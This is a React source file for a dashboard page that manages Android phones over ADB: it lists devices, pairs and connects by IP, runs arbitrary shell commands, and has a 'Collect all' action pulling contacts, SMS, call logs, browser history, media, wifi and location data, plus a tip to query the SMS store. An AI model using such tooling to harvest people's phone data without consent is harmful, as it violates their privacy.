import { useState } from "react";
import {
  Battery, Cpu, HardDrive, RefreshCw, Smartphone, TerminalSquare, Wifi, Zap,
} from "lucide-react";
import { api, useApi } from "@/lib/api";
import type { DeviceDetail, Job } from "@/lib/types";
import { useApp } from "@/state/AppContext";
import { Badge, Button, Empty, Field, Loading, Modal, PageHeader, Panel, Progress, Segmented } from "@/components/ui";
import { JobOutput } from "@/components/JobDrawer";
import { formatBytes, formatDateTime, timeAgo } from "@/lib/format";

export default function Devices() {
  const { devices, activeSerial, setActiveSerial, refreshDevices, connected } = useApp();
  const [showConnect, setShowConnect] = useState(false);
  const [showPair, setShowPair] = useState(false);
  const [shellJob, setShellJob] = useState<string | null>(null);
  const [collectJob, setCollectJob] = useState<string | null>(null);
  const [command, setCommand] = useState("getprop ro.product.model");
  const [tab, setTab] = useState<"overview" | "properties" | "shell">("overview");
  const [target, setTarget] = useState("");
  const [pairAddress, setPairAddress] = useState("");
  const [pairCode, setPairCode] = useState("");
  const [busy, setBusy] = useState(false);
  const [notice, setNotice] = useState<string | null>(null);

  const detail = useApi<{ device: DeviceDetail; connected: boolean }>(
    activeSerial ? `/devices/${encodeURIComponent(activeSerial)}` : null,
    { interval: 30000, deps: [activeSerial] },
  );

  const runShell = async () => {
    if (!activeSerial) return;
    const data = await api.post<{ job: Job }>(`/devices/${encodeURIComponent(activeSerial)}/shell`, {
      command,
    });
    setShellJob(data.job.id);
  };

  const collect = async () => {
    if (!activeSerial) return;
    const data = await api.post<{ job: Job }>(`/devices/${encodeURIComponent(activeSerial)}/collect`, {
      kinds: ["contacts", "sms", "calls", "browser", "apps", "media", "wifi", "locations", "activity"],
    });
    setCollectJob(data.job.id);
  };

  const connect = async () => {
    setBusy(true);
    setNotice(null);
    try {
      const data = await api.post<{ result: { stdout: string; stderr: string; ok: boolean } }>(
        "/devices/connect",
        { target },
      );
      setNotice((data.result.stdout || data.result.stderr || "done").trim());
      await refreshDevices();
    } catch (error) {
      setNotice(error instanceof Error ? error.message : String(error));
    } finally {
      setBusy(false);
    }
  };

  const pair = async () => {
    const data = await api.post<{ job: Job }>("/devices/pair", {
      address: pairAddress,
      code: pairCode,
    });
    setShowPair(false);
    setNotice(`Pairing job ${data.job.id} dispatched`);
  };

  const device = detail.data?.device;
  const selected = devices.find((d) => d.serial === activeSerial);

  return (
    <div className="page">
      <PageHeader
        title="Devices"
        subtitle="ADB inventory, fingerprints, shells and telemetry collection"
        actions={
          <>
            <Button size="sm" onClick={() => void refreshDevices()}>
              <RefreshCw size={13} /> Refresh
            </Button>
            <Button size="sm" onClick={() => setShowPair(true)}>
              <Wifi size={13} /> Pair
            </Button>
            <Button size="sm" variant="primary" onClick={() => setShowConnect(true)}>
              <Zap size={13} /> Connect
            </Button>
          </>
        }
      />

      {notice && (
        <div
          className="small"
          style={{
            border: "1px solid var(--line)",
            background: "var(--surface-2)",
            padding: "9px 12px",
            borderRadius: 6,
            marginBottom: 14,
          }}
        >
          {notice}
        </div>
      )}

      <Panel
        title={`Attached endpoints (${devices.length})`}
        tight
        actions={<Badge tone={connected ? "ok" : "err"} dot>{connected ? "adb online" : "adb offline"}</Badge>}
      >
        {devices.length === 0 ? (
          <Empty
            icon={<Smartphone size={18} />}
            title="No ADB devices detected"
            detail="Connect over USB with debugging enabled, or pair wirelessly."
            action={
              <Button size="sm" variant="primary" onClick={() => setShowConnect(true)}>
                Connect endpoint
              </Button>
            }
          />
        ) : (
          <div className="table-wrap">
            <table className="tbl">
              <thead>
                <tr>
                  <th>Device</th><th>Model</th><th>Android</th><th>Battery</th>
                  <th>State</th><th>Root</th><th>Transport</th><th />
                </tr>
              </thead>
              <tbody>
                {devices.map((record) => (
                  <tr
                    key={record.serial}
                    onClick={() => setActiveSerial(record.serial)}
                    style={{ cursor: "pointer" }}
                  >
                    <td>
                      <div className="row" style={{ gap: 9 }}>
                        <div className="avatar">{(record.model ?? record.serial).slice(0, 2).toUpperCase()}</div>
                        <div>
                          <div className="td-strong">{record.label || record.model || record.serial}</div>
                          <div className="tiny mute">{record.serial}</div>
                        </div>
                      </div>
                    </td>
                    <td className="td-truncate">{record.manufacturer ? `${record.manufacturer} · ` : ""}{record.model ?? "—"}</td>
                    <td className="td-mono">{record.androidVersion ?? "—"}{record.apiLevel ? ` (API ${record.apiLevel})` : ""}</td>
                    <td>
                      <div className="meter" style={{ width: 110 }}>
                        <Progress value={record.batteryLevel ?? 0} thin />
                        <span className="tiny mono">{record.batteryLevel != null ? `${record.batteryLevel}%` : "—"}</span>
                      </div>
                    </td>
                    <td><Badge tone={record.state === "device" ? "ok" : "warn"}>{record.state}</Badge></td>
                    <td><Badge tone={record.isRooted ? "warn" : "dim"}>{record.isRooted ? "rooted" : "stock"}</Badge></td>
                    <td className="td-mono">{record.transport ?? (record.isNetwork ? "tcp" : "usb")}</td>
                    <td>
                      <Button
                        size="xs"
                        onClick={(event) => {
                          event.stopPropagation();
                          setActiveSerial(record.serial);
                          setTab("shell");
                        }}
                      >
                        shell
                      </Button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}
      </Panel>

      {activeSerial && (
        <Panel
          title={`Inspector · ${device?.model ?? selected?.model ?? activeSerial}`}
          actions={
            <>
              <Segmented
                value={tab}
                onChange={setTab}
                options={[
                  { value: "overview", label: "Overview" },
                  { value: "properties", label: "Properties" },
                  { value: "shell", label: "Shell" },
                ]}
              />
              <Button size="sm" onClick={() => void collect()}>
                <RefreshCw size={12} /> Collect all
              </Button>
            </>
          }
        >
          {detail.loading && !device ? (
            <Loading label="Fingerprinting device…" rows={4} />
          ) : !device ? (
            <Empty title="Device not reachable" detail="The endpoint may have disconnected." />
          ) : (
            <>
              {tab === "overview" && (
                <>
                  <div className="grid-4">
                    <div className="stat info">
                      <div className="row" style={{ gap: 6 }}><Cpu size={12} /><span className="stat-label" style={{ marginTop: 0 }}>Hardware</span></div>
                      <div className="stat-value" style={{ fontSize: 16, marginTop: 6 }}>{device.model}</div>
                      <div className="stat-hint">{device.manufacturer} · {device.abi}</div>
                    </div>
                    <div className="stat">
                      <div className="row" style={{ gap: 6 }}><Battery size={12} /><span className="stat-label" style={{ marginTop: 0 }}>Battery</span></div>
                      <div className="stat-value" style={{ fontSize: 22, marginTop: 6 }}>{device.batteryLevel ?? "—"}%</div>
                      <Progress value={device.batteryLevel ?? 0} thin />
                    </div>
                    <div className="stat ok">
                      <div className="row" style={{ gap: 6 }}><HardDrive size={12} /><span className="stat-label" style={{ marginTop: 0 }}>Storage free</span></div>
                      <div className="stat-value" style={{ fontSize: 18, marginTop: 6 }}>
                        {device.storageFree != null ? formatBytes(device.storageFree) : "—"}
                      </div>
                      <div className="stat-hint">of {device.storageTotal != null ? formatBytes(device.storageTotal) : "—"}</div>
                    </div>
                    <div className="stat warn">
                      <div className="row" style={{ gap: 6 }}><Smartphone size={12} /><span className="stat-label" style={{ marginTop: 0 }}>OS</span></div>
                      <div className="stat-value" style={{ fontSize: 18, marginTop: 6 }}>Android {device.androidVersion}</div>
                      <div className="stat-hint">API {device.apiLevel} · patch {device.securityPatch}</div>
                    </div>
                  </div>

                  <div className="grid-2" style={{ marginTop: 14 }}>
                    <div>
                      <div className="kv"><span className="kv-k">Serial</span><span className="kv-v mono tiny">{device.serial}</span></div>
                      <div className="kv"><span className="kv-k">Build</span><span className="kv-v mono tiny">{device.buildId}</span></div>
                      <div className="kv"><span className="kv-k">Build type</span><span className="kv-v mono tiny">{device.buildType} / {device.buildTags}</span></div>
                      <div className="kv"><span className="kv-k">Device codename</span><span className="kv-v mono tiny">{device.device || "—"}</span></div>
                      <div className="kv"><span className="kv-k">Root</span><span className="kv-v"><Badge tone={device.isRooted ? "warn" : "dim"}>{device.isRooted ? "su present" : "no su"}</Badge></span></div>
                    </div>
                    <div>
                      <div className="kv"><span className="kv-k">Fingerprint</span><span className="kv-v mono tiny" style={{ maxWidth: 320 }}>{JSON.stringify(device.fingerprint ?? "—")}</span></div>
                      <div className="kv"><span className="kv-k">Linked</span><span className="kv-v">{detail.data?.connected ? "live" : "cached snapshot"}</span></div>
                      <div className="kv"><span className="kv-k">Label</span><span className="kv-v">{device.notes?.label ?? "—"}</span></div>
                      <div className="kv"><span className="kv-k">Group</span><span className="kv-v">{device.notes?.group ?? "—"}</span></div>
                      <div className="kv"><span className="kv-k">Note</span><span className="kv-v">{device.notes?.notes ?? "—"}</span></div>
                    </div>
                  </div>
                </>
              )}

              {tab === "properties" && (
                <div className="col" style={{ gap: 0, maxHeight: 460, overflowY: "auto" }}>
                  {Object.entries(device.properties)
                    .sort(([a], [b]) => a.localeCompare(b))
                    .map(([key, value]) => (
                      <div className="kv" key={key}>
                        <span className="kv-k mono tiny" style={{ textTransform: "none" }}>{key}</span>
                        <span className="kv-v mono tiny" style={{ maxWidth: 520 }}>{String(value ?? "—")}</span>
                      </div>
                    ))}
                </div>
              )}

              {tab === "shell" && (
                <div className="col" style={{ gap: 10 }}>
                  <div className="row" style={{ gap: 8 }}>
                    <input
                      className="input"
                      value={command}
                      onChange={(event) => setCommand(event.target.value)}
                      onKeyDown={(event) => event.key === "Enter" && void runShell()}
                      placeholder="adb shell command"
                    />
                    <Button size="sm" variant="primary" onClick={() => void runShell()}>
                      <TerminalSquare size={13} /> Run
                    </Button>
                  </div>
                  <JobOutput jobId={shellJob} title={`adb -s ${activeSerial} shell`} height={320} />
                  {!shellJob && (
                    <div className="tiny mute">
                      Tip: <code>getprop</code>, <code>dumpsys battery</code>, <code>pm list packages -3</code>,
                      <code>content query --uri content://sms</code>.
                    </div>
                  )}
                </div>
              )}
            </>
          )}

          {collectJob && (
            <div style={{ marginTop: 14 }}>
              <JobOutput jobId={collectJob} title="telemetry collection" height={220} />
            </div>
          )}
        </Panel>
      )}

      <Panel title="Recent device events" muted>
        <DeviceEvents />
      </Panel>

      {showConnect && (
        <Modal
          title="Connect ADB endpoint"
          onClose={() => setShowConnect(false)}
          footer={
            <>
              <Button size="sm" onClick={() => setShowConnect(false)}>Cancel</Button>
              <Button size="sm" variant="primary" disabled={busy || !target} onClick={() => void connect()}>
                {busy ? "Connecting…" : "Connect"}
              </Button>
            </>
          }
        >
          <Field label="Host:port or serial" hint="e.g. 192.168.1.105:5555 — USB serials also accepted">
            <input className="input" value={target} onChange={(e) => setTarget(e.target.value)} placeholder="192.168.1.105:5555" />
          </Field>
          <div className="tiny mute">
            Enable Developer options → Wireless debugging on the device first. Existing devices are
            enumerated automatically every 20 seconds.
          </div>
        </Modal>
      )}

      {showPair && (
        <Modal
          title="Wireless ADB pairing"
          onClose={() => setShowPair(false)}
          footer={
            <>
              <Button size="sm" onClick={() => setShowPair(false)}>Cancel</Button>
              <Button size="sm" variant="primary" disabled={!pairAddress || !pairCode} onClick={() => void pair()}>
                Pair
              </Button>
            </>
          }
        >
          <div className="form-row">
            <Field label="Pairing endpoint" hint="ip:port shown on the device">
              <input className="input" value={pairAddress} onChange={(e) => setPairAddress(e.target.value)} placeholder="192.168.1.112:37421" />
            </Field>
            <Field label="6-digit code">
              <input className="input" value={pairCode} onChange={(e) => setPairCode(e.target.value)} placeholder="123456" />
            </Field>
          </div>
        </Modal>
      )}
    </div>
  );
}

function DeviceEvents() {
  const { data } = useApi<{ events: { id: string; title: string; detail: string; at: number; level: string }[] }>(
    "/activity?kind=device&limit=8",
    { interval: 20000 },
  );
  if (!data?.events.length) {
    return <div className="tiny mute">No device events recorded yet.</div>;
  }
  return (
    <div className="col" style={{ gap: 6 }}>
      {data.events.map((event) => (
        <div className="row" key={event.id} style={{ justifyContent: "space-between", gap: 10 }}>
          <span className="row" style={{ gap: 8 }}>
            <span className={`dot ${event.level === "warn" ? "warn" : "ok"}`} />
            <span className="small">{event.title}</span>
          </span>
          <span className="tiny mute td-truncate" style={{ maxWidth: 300 }}>{event.detail}</span>
          <span className="tiny mute">{timeAgo(event.at * 1000)}</span>
        </div>
      ))}
    </div>
  );
}
